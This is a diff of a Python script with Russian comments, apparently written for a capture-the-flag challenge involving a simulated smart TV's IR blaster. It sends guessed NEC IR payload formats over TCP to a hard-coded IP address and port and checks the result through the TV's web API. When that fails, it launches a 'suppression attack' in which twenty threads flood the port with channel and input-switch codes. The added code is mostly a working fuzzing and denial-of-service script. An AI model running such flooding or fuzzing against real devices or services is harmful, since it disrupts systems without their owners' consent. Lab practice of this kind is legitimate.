@@ -160,33 +160,21 @@ if __name__ == "__main__":
 import socket
 import time
 import requests
+from threading import Thread
 
-# Настройки подключения
 HOST = '154.57.164.72'
 IR_PORT = 30241
 WEB_PORT = 32567
 
 BASE_URL = f"http://{HOST}:{WEB_PORT}"
-session = requests.Session()
-
-def get_tv_state():
-    try:
-        r = session.get(f"{BASE_URL}/api/state", timeout=1.0)
-        if r.status_code == 200:
-            return r.json()
-    except:
-        pass
-    return None
 
 def generate_nec_raw(address, command):
-    # Генерация таймингов NEC (Leader + 32 бита данных + Stop)
     inv_address = (~address) & 0xFF
     inv_command = (~command) & 0xFF
     bits = []
     for b in [address, inv_address, command, inv_command]:
-        for i in range(8):  # LSB-first
+        for i in range(8):
             bits.append((b >> i) & 1)
-            
     timings = [9000, 4500]
     for bit in bits:
         timings.append(560)
@@ -194,60 +182,63 @@ def generate_nec_raw(address, command):
     timings.append(560)
     return timings
 
-def fuzz_ir_dialects():
-    base_state = get_tv_state()
-    if not base_state:
-        print("[-] Веб-сервер недоступен. Проверь порты докера.")
-        return
-        
-    print(f"[*] Стартовое состояние ТВ: {base_state}")
-    print("[*] Запуск фуззинга форматов ИК-бластера...")
+def test_new_formats():
+    # Тестируем команду 2 (0x02) и смену инпута (обычно 0x0f или 0x0b)
+    # 00ff02fd в децимле = 16712445
+    dec_val = int("00ff02fd", 16)
+    raw_t = generate_nec_raw(0, 2)
+    flipper_format = " ".join([f"+{raw_t[i]}" if i % 2 == 0 else f"-{raw_t[i]}" for i in range(len(raw_t))])
     
-    # Будем тестировать команду 1 (обычно кнопка '1') и команду 2 ('2')
-    # Если формат верный, они обязаны отобразиться в 'digit_buffer'
-    test_commands = [1, 2]
+    payloads = [
+        f"{dec_val}\n",
+        f"{flipper_format}\n",
+        f'{{"frequency": 38000, "pattern": {raw_t}}}\n'
+    ]
     
-    try:
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            s.connect((HOST, IR_PORT))
+    print("[*] Проверка альтернативных стандартов бластера...")
+    for p in payloads:
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.connect((HOST, IR_PORT))
+                s.sendall(p.encode())
+                time.sleep(0.1)
+                res = requests.get(f"{BASE_URL}/api/state").json()
+                if res.get('digit_buffer') != "" or res.get('channel') != 1:
+                    print(f"[+] Найден верный формат: {p.strip()}")
+                    return True
+        except:
+            pass
+    return False
+
+def flood_worker(cmd_str):
+    # Воркер для непрерывного спама кодом в один поток
+    while True:
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.connect((HOST, IR_PORT))
+                while True:
+                    s.sendall(cmd_str.encode())
+                    time.sleep(0.005) # Максимальная скорость
+        except:
+            time.sleep(0.5) # Переподключение при обрыве
+
+def start_suppression_attack():
+    print("[*] Запуск атаки подавления (Flooding) со множества виртуальных телефонов...")
+    # Генерируем коды переключения на канал 2 (00ff02fd) и кнопку смены инпута (00ff0ffd)
+    targets = ["00ff02fd\n", "00ff0ffd\n"]
+    
+    threads = []
+    for t in targets:
+        for _ in range(10): # Открываем по 10 параллельных потоков на каждую команду
+            th = Thread(target=flood_worker, args=(t,), daemon=True)
+            th.start()
+            threads.append(th)
             
-            for cmd in test_commands:
-                inv_cmd = (~cmd) & 0xFF
-                hex_code = f"00ff{cmd:02x}{inv_cmd:02x}"
-                raw_timings = generate_nec_raw(0, cmd)
-                
-                # Семейство возможных форматов, которые часто используются в Android/Ритоне
-                dialects = [
-                    f'{{"key": "{cmd}"}}',
-                    f'{{"button": "{cmd}"}}',
-                    f'{{"command": "{cmd}"}}',
-                    f'{{"digit": "{cmd}"}}',
-                    f'{{"code": "{hex_code}"}}',
-                    f'{{"address": 0, "command": {cmd}}}',
-                    f"[{','.join(map(str, raw_timings))}]",  # JSON-массив сырых микросекунд
-                    f"NEC {hex_code}",
-                    f"NEC:{hex_code}",
-                    f"{cmd}"  # Просто отправка номера клавиши текстом
-                ]
-                
-                for payload in dialects:
-                    # Каждую команду обязательно завершаем переносом строки
-                    full_payload = payload + "\n"
-                    s.sendall(full_payload.encode())
-                    
-                    # Даем микропаузу бэкенду на обновление стейта
-                    time.sleep(0.05)
-                    
-                    curr_state = get_tv_state()
-                    if curr_state and curr_state != base_state:
-                        print(f"\n[+] УСПЕХ! Бэкенд среагировал на формат: {payload}")
-                        print(f"[+] Новое состояние: {curr_state}")
-                        return
-                    
-            print("[-] На базовых кнопках триггер не пойман. Проверь вывод скрипта.")
-            
-    except Exception as e:
-        print(f"[-] Сетевая ошибка: {e}")
+    print("[*] Атака запущена. Воркеры спамят ИК-сигналами. Внимательно следи за сайтом телевизора!")
+    # Даем атаке поработать 30 секунд
+    time.sleep(30)
 
 if __name__ == "__main__":
-    fuzz_ir_dialects()
+    if not test_new_formats():
+        print("[-] Альтернативные форматы в одиночном режиме не дали сдвига. Пробуем перебить трансляцию флудом...")
+        start_suppression_attack()
